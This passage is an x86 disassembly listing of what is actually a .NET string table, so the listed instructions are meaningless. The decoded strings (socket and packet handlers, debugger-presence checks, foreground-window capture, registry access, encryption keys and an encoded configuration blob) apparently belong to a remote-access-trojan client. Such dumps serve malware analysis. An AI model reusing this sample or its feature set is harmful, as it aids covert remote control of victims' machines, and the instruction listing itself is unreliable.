  40916d:	6f                   	outsl  %ds:(%esi),(%dx)
  40916e:	6c                   	insb   (%dx),%es:(%edi)
  40916f:	6c                   	insb   (%dx),%es:(%edi)
  409170:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409175:	6f                   	outsl  %ds:(%esi),(%dx)
  409176:	6e                   	outsb  %ds:(%esi),(%dx)
  409177:	6e                   	outsb  %ds:(%esi),(%dx)
  409178:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  40917d:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409181:	6e                   	outsb  %ds:(%esi),(%dx)
  409182:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  409187:	65 74 00             	gs je  0x40918a
  40918a:	53                   	push   %ebx
  40918b:	79 73                	jns    0x409200
  40918d:	74 65                	je     0x4091f4
  40918f:	6d                   	insl   (%dx),%es:(%edi)
  409190:	2e 4e                	cs dec %esi
  409192:	65 74 00             	gs je  0x409195
  409195:	53                   	push   %ebx
  409196:	65 74 00             	gs je  0x409199
  409199:	54                   	push   %esp
  40919a:	61                   	popa
  40919b:	72 67                	jb     0x409204
  40919d:	65 74 00             	gs je  0x4091a0
  4091a0:	43                   	inc    %ebx
  4091a1:	6c                   	insb   (%dx),%es:(%edi)
  4091a2:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4091aa:	64 6c                	fs insb (%dx),%es:(%edi)
  4091ac:	65 5f                	gs pop %edi
  4091ae:	50                   	push   %eax
  4091af:	61                   	popa
  4091b0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091b3:	74 00                	je     0x4091b5
  4091b5:	4b                   	dec    %ebx
  4091b6:	65 65 70 41          	gs gs jo 0x4091fb
  4091ba:	6c                   	insb   (%dx),%es:(%edi)
  4091bb:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091c2:	65 74 00             	gs je  0x4091c5
  4091c5:	43                   	inc    %ebx
  4091c6:	6c                   	insb   (%dx),%es:(%edi)
  4091c7:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091ce:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091d2:	53                   	push   %ebx
  4091d3:	79 73                	jns    0x409248
  4091d5:	74 65                	je     0x40923c
  4091d7:	6d                   	insl   (%dx),%es:(%edi)
  4091d8:	2e 43                	cs inc %ebx
  4091da:	6f                   	outsl  %ds:(%esi),(%dx)
  4091db:	6c                   	insb   (%dx),%es:(%edi)
  4091dc:	6c                   	insb   (%dx),%es:(%edi)
  4091dd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e3:	73 2e                	jae    0x409213
  4091e5:	49                   	dec    %ecx
  4091e6:	45                   	inc    %ebp
  4091e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e8:	75 6d                	jne    0x409257
  4091ea:	65 72 61             	gs jb  0x40924e
  4091ed:	74 6f                	je     0x40925e
  4091ef:	72 2e                	jb     0x40921f
  4091f1:	52                   	push   %edx
  4091f2:	65 73 65             	gs jae 0x40925a
  4091f5:	74 00                	je     0x4091f7
  4091f7:	67 65 74 5f          	addr16 gs je 0x40925a
  4091fb:	4f                   	dec    %edi
  4091fc:	66 66 73 65          	data16 data16 jae 0x409265
  409200:	74 00                	je     0x409202
  409202:	73 65                	jae    0x409269
  409204:	74 5f                	je     0x409265
  409206:	4f                   	dec    %edi
  409207:	66 66 73 65          	data16 data16 jae 0x409270
  40920b:	74 00                	je     0x40920d
  40920d:	53                   	push   %ebx
  40920e:	70 6c                	jo     0x40927c
  409210:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409217:	6e 
  409218:	74 4f                	je     0x409269
  40921a:	6e                   	outsb  %ds:(%esi),(%dx)
  40921b:	45                   	inc    %ebp
  40921c:	78 69                	js     0x409287
  40921e:	74 00                	je     0x409220
  409220:	53                   	push   %ebx
  409221:	61                   	popa
  409222:	6c                   	insb   (%dx),%es:(%edi)
  409223:	74 00                	je     0x409225
  409225:	49                   	dec    %ecx
  409226:	41                   	inc    %ecx
  409227:	73 79                	jae    0x4092a2
  409229:	6e                   	outsb  %ds:(%esi),(%dx)
  40922a:	63 52 65             	arpl   %edx,0x65(%edx)
  40922d:	73 75                	jae    0x4092a4
  40922f:	6c                   	insb   (%dx),%es:(%edi)
  409230:	74 00                	je     0x409232
  409232:	54                   	push   %esp
  409233:	6f                   	outsl  %ds:(%esi),(%dx)
  409234:	55                   	push   %ebp
  409235:	70 70                	jo     0x4092a7
  409237:	65 72 49             	gs jb  0x409283
  40923a:	6e                   	outsb  %ds:(%esi),(%dx)
  40923b:	76 61                	jbe    0x40929e
  40923d:	72 69                	jb     0x4092a8
  40923f:	61                   	popa
  409240:	6e                   	outsb  %ds:(%esi),(%dx)
  409241:	74 00                	je     0x409243
  409243:	57                   	push   %edi
  409244:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409248:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  40924f:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409256:	65 
  409257:	43                   	inc    %ebx
  409258:	6c                   	insb   (%dx),%es:(%edi)
  409259:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409260:	74 5f                	je     0x4092c1
  409262:	53                   	push   %ebx
  409263:	73 6c                	jae    0x4092d1
  409265:	43                   	inc    %ebx
  409266:	6c                   	insb   (%dx),%es:(%edi)
  409267:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40926e:	74 5f                	je     0x4092cf
  409270:	53                   	push   %ebx
  409271:	73 6c                	jae    0x4092df
  409273:	43                   	inc    %ebx
  409274:	6c                   	insb   (%dx),%es:(%edi)
  409275:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40927c:	74 5f                	je     0x4092dd
  40927e:	54                   	push   %esp
  40927f:	63 70 43             	arpl   %esi,0x43(%eax)
  409282:	6c                   	insb   (%dx),%es:(%edi)
  409283:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  40928a:	74 5f                	je     0x4092eb
  40928c:	54                   	push   %esp
  40928d:	63 70 43             	arpl   %esi,0x43(%eax)
  409290:	6c                   	insb   (%dx),%es:(%edi)
  409291:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409298:	74 68                	je     0x409302
  40929a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40929c:	74 69                	je     0x409307
  40929e:	63 61 74             	arpl   %esp,0x74(%ecx)
  4092a1:	65 41                	gs inc %ecx
  4092a3:	73 43                	jae    0x4092e8
  4092a5:	6c                   	insb   (%dx),%es:(%edi)
  4092a6:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092ad:	73 74                	jae    0x409323
  4092af:	65 6d                	gs insl (%dx),%es:(%edi)
  4092b1:	2e 4d                	cs dec %ebp
  4092b3:	61                   	popa
  4092b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b5:	61                   	popa
  4092b6:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092b9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092bb:	74 00                	je     0x4092bd
  4092bd:	45                   	inc    %ebp
  4092be:	6e                   	outsb  %ds:(%esi),(%dx)
  4092bf:	76 69                	jbe    0x40932a
  4092c1:	72 6f                	jb     0x409332
  4092c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c4:	6d                   	insl   (%dx),%es:(%edi)
  4092c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c7:	74 00                	je     0x4092c9
  4092c9:	70 61                	jo     0x40932c
  4092cb:	72 65                	jb     0x409332
  4092cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ce:	74 00                	je     0x4092d0
  4092d0:	53                   	push   %ebx
  4092d1:	79 73                	jns    0x409346
  4092d3:	74 65                	je     0x40933a
  4092d5:	6d                   	insl   (%dx),%es:(%edi)
  4092d6:	2e 43                	cs inc %ebx
  4092d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d9:	6c                   	insb   (%dx),%es:(%edi)
  4092da:	6c                   	insb   (%dx),%es:(%edi)
  4092db:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e1:	73 2e                	jae    0x409311
  4092e3:	49                   	dec    %ecx
  4092e4:	45                   	inc    %ebp
  4092e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e6:	75 6d                	jne    0x409355
  4092e8:	65 72 61             	gs jb  0x40934c
  4092eb:	74 6f                	je     0x40935c
  4092ed:	72 2e                	jb     0x40931d
  4092ef:	43                   	inc    %ebx
  4092f0:	75 72                	jne    0x409364
  4092f2:	72 65                	jb     0x409359
  4092f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f5:	74 00                	je     0x4092f7
  4092f7:	53                   	push   %ebx
  4092f8:	79 73                	jns    0x40936d
  4092fa:	74 65                	je     0x409361
  4092fc:	6d                   	insl   (%dx),%es:(%edi)
  4092fd:	2e 43                	cs inc %ebx
  4092ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409300:	6c                   	insb   (%dx),%es:(%edi)
  409301:	6c                   	insb   (%dx),%es:(%edi)
  409302:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409307:	6e                   	outsb  %ds:(%esi),(%dx)
  409308:	73 2e                	jae    0x409338
  40930a:	49                   	dec    %ecx
  40930b:	45                   	inc    %ebp
  40930c:	6e                   	outsb  %ds:(%esi),(%dx)
  40930d:	75 6d                	jne    0x40937c
  40930f:	65 72 61             	gs jb  0x409373
  409312:	74 6f                	je     0x409383
  409314:	72 2e                	jb     0x409344
  409316:	67 65 74 5f          	addr16 gs je 0x409379
  40931a:	43                   	inc    %ebx
  40931b:	75 72                	jne    0x40938f
  40931d:	72 65                	jb     0x409384
  40931f:	6e                   	outsb  %ds:(%esi),(%dx)
  409320:	74 00                	je     0x409322
  409322:	47                   	inc    %edi
  409323:	65 74 43             	gs je  0x409369
  409326:	75 72                	jne    0x40939a
  409328:	72 65                	jb     0x40938f
  40932a:	6e                   	outsb  %ds:(%esi),(%dx)
  40932b:	74 00                	je     0x40932d
  40932d:	43                   	inc    %ebx
  40932e:	68 65 63 6b 52       	push   $0x526b6365
  409333:	65 6d                	gs insl (%dx),%es:(%edi)
  409335:	6f                   	outsl  %ds:(%esi),(%dx)
  409336:	74 65                	je     0x40939d
  409338:	44                   	inc    %esp
  409339:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40933d:	67 65 72 50          	addr16 gs jb 0x409391
  409341:	72 65                	jb     0x4093a8
  409343:	73 65                	jae    0x4093aa
  409345:	6e                   	outsb  %ds:(%esi),(%dx)
  409346:	74 00                	je     0x409348
  409348:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  40934f:	67 65 72 50          	addr16 gs jb 0x4093a3
  409353:	72 65                	jb     0x4093ba
  409355:	73 65                	jae    0x4093bc
  409357:	6e                   	outsb  %ds:(%esi),(%dx)
  409358:	74 00                	je     0x40935a
  40935a:	67 65 74 5f          	addr16 gs je 0x4093bd
  40935e:	52                   	push   %edx
  40935f:	65 6d                	gs insl (%dx),%es:(%edi)
  409361:	6f                   	outsl  %ds:(%esi),(%dx)
  409362:	74 65                	je     0x4093c9
  409364:	45                   	inc    %ebp
  409365:	6e                   	outsb  %ds:(%esi),(%dx)
  409366:	64 50                	fs push %eax
  409368:	6f                   	outsl  %ds:(%esi),(%dx)
  409369:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409370:	5f                   	pop    %edi
  409371:	43                   	inc    %ebx
  409372:	6f                   	outsl  %ds:(%esi),(%dx)
  409373:	75 6e                	jne    0x4093e3
  409375:	74 00                	je     0x409377
  409377:	67 65 74 5f          	addr16 gs je 0x4093da
  40937b:	50                   	push   %eax
  40937c:	72 6f                	jb     0x4093ed
  40937e:	63 65 73             	arpl   %esp,0x73(%ebp)
  409381:	73 6f                	jae    0x4093f2
  409383:	72 43                	jb     0x4093c8
  409385:	6f                   	outsl  %ds:(%esi),(%dx)
  409386:	75 6e                	jne    0x4093f6
  409388:	74 00                	je     0x40938a
  40938a:	63 6f 75             	arpl   %ebp,0x75(%edi)
  40938d:	6e                   	outsb  %ds:(%esi),(%dx)
  40938e:	74 00                	je     0x409390
  409390:	47                   	inc    %edi
  409391:	65 74 50             	gs je  0x4093e4
  409394:	61                   	popa
  409395:	74 68                	je     0x4093ff
  409397:	52                   	push   %edx
  409398:	6f                   	outsl  %ds:(%esi),(%dx)
  409399:	6f                   	outsl  %ds:(%esi),(%dx)
  40939a:	74 00                	je     0x40939c
  40939c:	44                   	inc    %esp
  40939d:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  4093a1:	70 74                	jo     0x409417
  4093a3:	00 45 6e             	add    %al,0x6e(%ebp)
  4093a6:	63 72 79             	arpl   %esi,0x79(%edx)
  4093a9:	70 74                	jo     0x40941f
  4093ab:	00 50 61             	add    %dl,0x61(%eax)
  4093ae:	72 61                	jb     0x409411
  4093b0:	6d                   	insl   (%dx),%es:(%edi)
  4093b1:	65 74 65             	gs je  0x409419
  4093b4:	72 69                	jb     0x40941f
  4093b6:	7a 65                	jp     0x40941d
  4093b8:	64 54                	fs push %esp
  4093ba:	68 72 65 61 64       	push   $0x64616572
  4093bf:	53                   	push   %ebx
  4093c0:	74 61                	je     0x409423
  4093c2:	72 74                	jb     0x409438
  4093c4:	00 43 6f             	add    %al,0x6f(%ebx)
  4093c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c8:	76 65                	jbe    0x40942f
  4093ca:	72 74                	jb     0x409440
  4093cc:	00 46 61             	add    %al,0x61(%esi)
  4093cf:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093d6:	54 
  4093d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d8:	4c                   	dec    %esp
  4093d9:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093e0:	75 74                	jne    0x409456
  4093e2:	00 53 79             	add    %dl,0x79(%ebx)
  4093e5:	73 74                	jae    0x40945b
  4093e7:	65 6d                	gs insl (%dx),%es:(%edi)
  4093e9:	2e 43                	cs inc %ebx
  4093eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ec:	6c                   	insb   (%dx),%es:(%edi)
  4093ed:	6c                   	insb   (%dx),%es:(%edi)
  4093ee:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f4:	73 2e                	jae    0x409424
  4093f6:	49                   	dec    %ecx
  4093f7:	45                   	inc    %ebp
  4093f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f9:	75 6d                	jne    0x409468
  4093fb:	65 72 61             	gs jb  0x40945f
  4093fe:	74 6f                	je     0x40946f
  409400:	72 2e                	jb     0x409430
  409402:	4d                   	dec    %ebp
  409403:	6f                   	outsl  %ds:(%esi),(%dx)
  409404:	76 65                	jbe    0x40946b
  409406:	4e                   	dec    %esi
  409407:	65 78 74             	gs js  0x40947e
  40940a:	00 53 79             	add    %dl,0x79(%ebx)
  40940d:	73 74                	jae    0x409483
  40940f:	65 6d                	gs insl (%dx),%es:(%edi)
  409411:	2e 54                	cs push %esp
  409413:	65 78 74             	gs js  0x40948a
  409416:	00 47 65             	add    %al,0x65(%edi)
  409419:	74 57                	je     0x409472
  40941b:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409422:	78 74                	js     0x409498
  409424:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409428:	74 00                	je     0x40942a
  40942a:	76 00                	jbe    0x40942c
  40942c:	47                   	inc    %edi
  40942d:	65 74 46             	gs je  0x409476
  409430:	6f                   	outsl  %ds:(%esi),(%dx)
  409431:	72 65                	jb     0x409498
  409433:	67 72 6f             	addr16 jb 0x4094a5
  409436:	75 6e                	jne    0x4094a6
  409438:	64 57                	fs push %edi
  40943a:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409441:	65 74 5f             	gs je  0x4094a3
  409444:	43                   	inc    %ebx
  409445:	72 65                	jb     0x4094ac
  409447:	61                   	popa
  409448:	74 65                	je     0x4094af
  40944a:	4e                   	dec    %esi
  40944b:	6f                   	outsl  %ds:(%esi),(%dx)
  40944c:	57                   	push   %edi
  40944d:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  409454:	6e                   	outsb  %ds:(%esi),(%dx)
  409455:	64 65 78 00          	fs gs js 0x409459
  409459:	43                   	inc    %ebx
  40945a:	6c                   	insb   (%dx),%es:(%edi)
  40945b:	6f                   	outsl  %ds:(%esi),(%dx)
  40945c:	73 65                	jae    0x4094c3
  40945e:	4d                   	dec    %ebp
  40945f:	75 74                	jne    0x4094d5
  409461:	65 78 00             	gs js  0x409464
  409464:	43                   	inc    %ebx
  409465:	72 65                	jb     0x4094cc
  409467:	61                   	popa
  409468:	74 65                	je     0x4094cf
  40946a:	4d                   	dec    %ebp
  40946b:	75 74                	jne    0x4094e1
  40946d:	65 78 00             	gs js  0x409470
  409470:	44                   	inc    %esp
  409471:	65 6c                	gs insb (%dx),%es:(%edi)
  409473:	61                   	popa
  409474:	79 00                	jns    0x409476
  409476:	57                   	push   %edi
  409477:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  40947e:	61                   	popa
  40947f:	79 00                	jns    0x409481
  409481:	49                   	dec    %ecx
  409482:	6e                   	outsb  %ds:(%esi),(%dx)
  409483:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40948a:	65 
  40948b:	41                   	inc    %ecx
  40948c:	72 72                	jb     0x409500
  40948e:	61                   	popa
  40948f:	79 00                	jns    0x409491
  409491:	4d                   	dec    %ebp
  409492:	73 67                	jae    0x4094fb
  409494:	50                   	push   %eax
  409495:	61                   	popa
  409496:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409499:	72 72                	jb     0x40950d
  40949b:	61                   	popa
  40949c:	79 00                	jns    0x40949e
  40949e:	54                   	push   %esp
  40949f:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a0:	41                   	inc    %ecx
  4094a1:	72 72                	jb     0x409515
  4094a3:	61                   	popa
  4094a4:	79 00                	jns    0x4094a6
  4094a6:	67 65 74 5f          	addr16 gs je 0x409509
  4094aa:	41                   	inc    %ecx
  4094ab:	73 41                	jae    0x4094ee
  4094ad:	72 72                	jb     0x409521
  4094af:	61                   	popa
  4094b0:	79 00                	jns    0x4094b2
  4094b2:	72 65                	jb     0x409519
  4094b4:	66 41                	inc    %cx
  4094b6:	73 41                	jae    0x4094f9
  4094b8:	72 72                	jb     0x40952c
  4094ba:	61                   	popa
  4094bb:	79 00                	jns    0x4094bd
  4094bd:	67 65 74 5f          	addr16 gs je 0x409520
  4094c1:	4b                   	dec    %ebx
  4094c2:	65 79 00             	gs jns 0x4094c5
  4094c5:	73 65                	jae    0x40952c
  4094c7:	74 5f                	je     0x409528
  4094c9:	4b                   	dec    %ebx
  4094ca:	65 79 00             	gs jns 0x4094cd
  4094cd:	43                   	inc    %ebx
  4094ce:	72 65                	jb     0x409535
  4094d0:	61                   	popa
  4094d1:	74 65                	je     0x409538
  4094d3:	53                   	push   %ebx
  4094d4:	75 62                	jne    0x409538
  4094d6:	4b                   	dec    %ebx
  4094d7:	65 79 00             	gs jns 0x4094da
  4094da:	44                   	inc    %esp
  4094db:	65 6c                	gs insb (%dx),%es:(%edi)
  4094dd:	65 74 65             	gs je  0x409545
  4094e0:	53                   	push   %ebx
  4094e1:	75 62                	jne    0x409545
  4094e3:	4b                   	dec    %ebx
  4094e4:	65 79 00             	gs jns 0x4094e7
  4094e7:	4f                   	dec    %edi
  4094e8:	70 65                	jo     0x40954f
  4094ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4094eb:	53                   	push   %ebx
  4094ec:	75 62                	jne    0x409550
  4094ee:	4b                   	dec    %ebx
  4094ef:	65 79 00             	gs jns 0x4094f2
  4094f2:	67 65 74 5f          	addr16 gs je 0x409555
  4094f6:	50                   	push   %eax
  4094f7:	75 62                	jne    0x40955b
  4094f9:	6c                   	insb   (%dx),%es:(%edi)
  4094fa:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  409501:	61                   	popa
  409502:	75 74                	jne    0x409578
  409504:	68 4b 65 79 00       	push   $0x79654b
  409509:	6d                   	insl   (%dx),%es:(%edi)
  40950a:	61                   	popa
  40950b:	73 74                	jae    0x409581
  40950d:	65 72 4b             	gs jb  0x40955b
  409510:	65 79 00             	gs jns 0x409513
  409513:	52                   	push   %edx
  409514:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40951b:	4b 65 
  40951d:	79 00                	jns    0x40951f
  40951f:	5f                   	pop    %edi
  409520:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  409524:	53                   	push   %ebx
  409525:	79 73                	jns    0x40959a
  409527:	74 65                	je     0x40958e
  409529:	6d                   	insl   (%dx),%es:(%edi)
  40952a:	2e 53                	cs push %ebx
  40952c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409530:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409537:	70 
  409538:	74 6f                	je     0x4095a9
  40953a:	67 72 61             	addr16 jb 0x40959e
  40953d:	70 68                	jo     0x4095a7
  40953f:	79 00                	jns    0x409541
  409541:	41                   	inc    %ecx
  409542:	73 73                	jae    0x4095b7
  409544:	65 6d                	gs insl (%dx),%es:(%edi)
  409546:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40954a:	41                   	inc    %ecx
  40954b:	64 64 72 65          	fs fs jb 0x4095b4
  40954f:	73 73                	jae    0x4095c4
  409551:	46                   	inc    %esi
  409552:	61                   	popa
  409553:	6d                   	insl   (%dx),%es:(%edi)
  409554:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  40955b:	63 
  40955c:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409560:	79 00                	jns    0x409562
  409562:	57                   	push   %edi
  409563:	72 69                	jb     0x4095ce
  409565:	74 65                	je     0x4095cc
  409567:	42                   	inc    %edx
  409568:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  40956f:	6f                   	outsl  %ds:(%esi),(%dx)
  409570:	42                   	inc    %edx
  409571:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409578:	65 74 5f             	gs je  0x4095da
  40957b:	53                   	push   %ebx
  40957c:	79 73                	jns    0x4095f1
  40957e:	74 65                	je     0x4095e5
  409580:	6d                   	insl   (%dx),%es:(%edi)
  409581:	44                   	inc    %esp
  409582:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409589:	79 00                	jns    0x40958b
  40958b:	53                   	push   %ebx
  40958c:	65 74 52             	gs je  0x4095e1
  40958f:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409596:	00 6f 
  409598:	70 5f                	jo     0x4095f9
  40959a:	45                   	inc    %ebp
  40959b:	71 75                	jno    0x409612
  40959d:	61                   	popa
  40959e:	6c                   	insb   (%dx),%es:(%edi)
  40959f:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095a6:	49 
  4095a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a8:	65 71 75             	gs jno 0x409620
  4095ab:	61                   	popa
  4095ac:	6c                   	insb   (%dx),%es:(%edi)
  4095ad:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095b4:	74 
  4095b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4095b7:	2e 4e                	cs dec %esi
  4095b9:	65 74 2e             	gs je  0x4095ea
  4095bc:	53                   	push   %ebx
  4095bd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095c1:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095c8:	64 
  4095c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4095ca:	77 73                	ja     0x40963f
  4095cc:	49                   	dec    %ecx
  4095cd:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095d0:	74 69                	je     0x40963b
  4095d2:	74 79                	je     0x40964d
  4095d4:	00 49 73             	add    %cl,0x73(%ecx)
  4095d7:	4e                   	dec    %esi
  4095d8:	75 6c                	jne    0x409646
  4095da:	6c                   	insb   (%dx),%es:(%edi)
  4095db:	4f                   	dec    %edi
  4095dc:	72 45                	jb     0x409623
  4095de:	6d                   	insl   (%dx),%es:(%edi)
  4095df:	70 74                	jo     0x409655
  4095e1:	79 00                	jns    0x4095e3
  4095e3:	00 00                	add    %al,(%eax)
  4095e5:	0d 53 00 48 00       	or     $0x480053,%eax
  4095ea:	41                   	inc    %ecx
  4095eb:	00 32                	add    %dh,(%edx)
  4095ed:	00 35 00 36 00 00    	add    %dh,0x3600
  4095f3:	80 d9 49             	sbb    $0x49,%cl
  4095f6:	00 4d 00             	add    %cl,0x0(%ebp)
  4095f9:	6d                   	insl   (%dx),%es:(%edi)
  4095fa:	00 47 00             	add    %al,0x0(%edi)
  4095fd:	6b 00 31             	imul   $0x31,(%eax),%eax
  409600:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  409604:	00 61 00             	add    %ah,0x0(%ecx)
  409607:	4e                   	dec    %esi
  409608:	00 69 00             	add    %ch,0x0(%ecx)
  40960b:	59                   	pop    %ecx
  40960c:	00 4b 00             	add    %cl,0x0(%ebx)
  40960f:	42                   	inc    %edx
  409610:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  409614:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  409618:	00 71 00             	add    %dh,0x0(%ecx)
  40961b:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40961e:	00 42 00             	add    %al,0x0(%edx)
  409621:	61                   	popa
  409622:	00 6f 00             	add    %ch,0x0(%edi)
  409625:	30 00                	xor    %al,(%eax)
  409627:	6f                   	outsl  %ds:(%esi),(%dx)
  409628:	00 35 00 4a 00 72    	add    %dh,0x72004a00
  40962e:	00 65 00             	add    %ah,0x0(%ebp)
  409631:	32 00                	xor    (%eax),%al
  409633:	4c                   	dec    %esp
  409634:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  409638:	00 67 00             	add    %ah,0x0(%edi)
  40963b:	57                   	push   %edi
  40963c:	00 33                	add    %dh,(%ebx)
  40963e:	00 66 00             	add    %ah,0x0(%esi)
  409641:	6a 00                	push   $0x0
  409643:	32 00                	xor    (%eax),%al
  409645:	58                   	pop    %eax
  409646:	00 38                	add    %bh,(%eax)
  409648:	00 47 00             	add    %al,0x0(%edi)
  40964b:	6a 00                	push   $0x0
  40964d:	50                   	push   %eax
  40964e:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  409652:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  409656:	00 36                	add    %dh,(%esi)
  409658:	00 51 00             	add    %dl,0x0(%ecx)
  40965b:	77 00                	ja     0x40965d
  40965d:	63 00                	arpl   %eax,(%eax)
  40965f:	67 00 47 00          	add    %al,0x0(%bx)
  409663:	78 00                	js     0x409665
  409665:	75 00                	jne    0x409667
  409667:	44                   	inc    %esp
  409668:	00 39                	add    %bh,(%ecx)
  40966a:	00 53 00             	add    %dl,0x0(%ebx)
  40966d:	48                   	dec    %eax
  40966e:	00 66 00             	add    %ah,0x0(%esi)
  409671:	6f                   	outsl  %ds:(%esi),(%dx)
  409672:	00 49 00             	add    %cl,0x0(%ecx)
  409675:	55                   	push   %ebp
  409676:	00 37                	add    %dh,(%edi)
  409678:	00 70 00             	add    %dh,0x0(%eax)
  40967b:	51                   	push   %ecx
  40967c:	00 4e 00             	add    %cl,0x0(%esi)
  40967f:	37                   	aaa
  409680:	00 56 00             	add    %dl,0x0(%esi)
  409683:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  409687:	44                   	inc    %esp
  409688:	00 59 00             	add    %bl,0x0(%ecx)
  40968b:	78 00                	js     0x40968d
  40968d:	2f                   	das
  40968e:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  409692:	00 55 00             	add    %dl,0x0(%ebp)
  409695:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  409699:	70 00                	jo     0x40969b
  40969b:	68 00 36 00 65       	push   $0x65003600
  4096a0:	00 35 00 6d 00 69    	add    %dh,0x69006d00
  4096a6:	00 49 00             	add    %cl,0x0(%ecx)
  4096a9:	35 00 79 00 4b       	xor    $0x4b007900,%eax
  4096ae:	00 38                	add    %bh,(%eax)
  4096b0:	00 6e 00             	add    %ch,0x0(%esi)
  4096b3:	67 00 38             	add    %bh,(%bx,%si)
  4096b6:	00 49 00             	add    %cl,0x0(%ecx)
  4096b9:	58                   	pop    %eax
